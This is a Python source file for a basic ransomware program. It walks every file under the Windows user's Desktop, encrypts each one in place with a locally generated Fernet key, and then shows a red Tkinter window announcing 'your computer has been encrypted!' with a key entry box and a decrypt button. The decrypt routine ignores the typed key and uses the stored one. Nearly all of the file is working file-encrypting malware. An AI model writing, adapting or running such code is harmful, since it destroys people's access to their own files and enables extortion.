from cryptography.fernet import Fernet
import os
import time
import tkinter as tk
import time


class Encryptor():

    def key_create(self):
        key = Fernet.generate_key()
        return key

    def key_write(self, key, key_name):
        with open(key_name, 'wb') as mykey:
            mykey.write(key)

    def key_load(self, key_name):
        with open(key_name, 'rb') as mykey:
            key = mykey.read()
        return key

    def file_encrypt(self, key, original_file):
        f = Fernet(key)

        with open(original_file, 'rb') as file:
            original = file.read()

        encrypted = f.encrypt(original)

        with open(original_file, 'wb') as file:
            file.write(encrypted)

    def file_decrypt(self, key, encrypted_file):
        f = Fernet(key)

        with open(encrypted_file, 'rb') as file:
            encrypted = file.read()

        decrypted = f.decrypt(encrypted)

        with open(encrypted_file, 'wb') as file:
            file.write(decrypted)


def decrypt(key):
    for file in files_to_encrypt:

        try:
            encryptor.file_decrypt(loaded_key, file)
        except:
            continue

    frame.destroy()


def get_key():
    global key_entry
    decrypt(key_entry.get())


files_to_encrypt = []

path_to_encrypt = os.walk(os.environ['USERPROFILE'] + '\Desktop')

for root, dirs, files in path_to_encrypt:
    for file in files:
        # files_to_encrypt.append(os.path.abspath(file))
        files_to_encrypt.append(f'{root}\\{file}')

print(f'FILES ENCRYPTED: {len(files_to_encrypt)}')

encryptor = Encryptor()

mykey = encryptor.key_create()

encryptor.key_write(mykey, 'mykey.key')

loaded_key = encryptor.key_load('mykey.key')

for file in files_to_encrypt:

    try:
        encryptor.file_encrypt(loaded_key, file)
    except FileNotFoundError:
        continue
    except PermissionError:
        continue
    except OSError:
        continue

print(f'KEY: {loaded_key}')

# try:
#     [encryptor.file_encrypt(loaded_key, _) for _ in files_to_encrypt]
# except FileNotFoundError:
#     pass
# except PermissionError:
#     pass

time.sleep(3)

frame = tk.Tk()
frame.title('your computer has been encrypted!')
#frame.attributes('-fullscreen', True)
frame.geometry('500x500')
frame['bg'] = '#E10600'
frame.resizable(False, False)

key_entry = tk.Entry(frame)
key_entry.place(x=0, y=0)

key_submition = tk.Button(frame, text='decrypt', command=get_key)
key_submition.place(x=0, y=20)


frame.mainloop()

# try:
#     [encryptor.file_decrypt(loaded_key, _) for _ in files_to_encrypt]
# except:
#     pass
